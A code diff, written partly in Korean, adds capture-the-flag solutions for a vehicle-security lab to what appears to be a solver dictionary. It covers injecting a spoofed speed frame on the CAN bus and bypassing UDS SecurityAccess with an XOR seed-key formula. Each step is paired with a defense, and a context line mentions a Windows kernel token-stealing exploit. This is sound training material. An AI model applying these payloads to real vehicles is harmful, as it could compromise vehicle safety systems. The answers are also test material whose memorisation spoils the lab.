@@ -325,6 +325,29 @@ SOLVERS: Dict[str, Dict[str, Any]] = {
                 "sample_output": "EPROCESS Token Swapped -> Current PID elevated to NT AUTHORITY\\SYSTEM! FLAG{hevd_token_stealing_privesc_88c4}"
             }
         ]
+    },
+    "21": {
+        "title": "차량 보안 & CAN Bus 실전 랩 (CarCanLab)",
+        "steps": [
+            {
+                "step": 1,
+                "name": "CAN 버스 0x120 속도 스푸핑 주입",
+                "target": "POST /api/mission1/can_inject (can_id=0x120, dlc=8, payload_hex)",
+                "poc_explanation": "차속 센서가 사용하는 CAN ID 0x120 프레임의 데이터 필드에 200 km/h(0xC8) 이상의 바이트를 주입하여 클러스터 오버드라이브 경고를 발생시킵니다.",
+                "exploit_payload": '{"can_id": "0x120", "dlc": 8, "payload_hex": "0000C80000000000"}',
+                "defense": "SecOC(Secure Onboard Communication) 기반 CMAC 메시지 인증 코드 및 Freshness Counter 검증 도입.",
+                "sample_output": "🚨 Overdrive Alert! Speed: 200 km/h -> FLAG{can_bus_arbitration_speed_spoof_8821}"
+            },
+            {
+                "step": 2,
+                "name": "UDS Extended 세션 전환 및 SecurityAccess 대칭키 인증 우회",
+                "target": "POST /api/mission2/uds_session & /api/mission2/uds_security_unlock",
+                "poc_explanation": "Extended 진단 세션(0x10 0x03)으로 전환한 뒤, Mode 0x27 0x01로 난수 시드를 요청하고 seed ^ 0x5A5A5A5A 대칭키 공식을 역연산하여 전장 제어기를 언락합니다.",
+                "exploit_payload": "key_hex = hex(seed ^ 0x5A5A5A5A)[2:].upper().zfill(8)",
+                "defense": "하드웨어 기반 비대칭 공개키 서명 인증(ECC/RSA) 및 연속 시도 실패 시 지수 백오프 잠금 강제.",
+                "sample_output": "🎉 SecurityAccess Unlocked! -> FLAG{uds_security_access_seed_key_unlocked_3714}"
+            }
+        ]
     }
 }
 
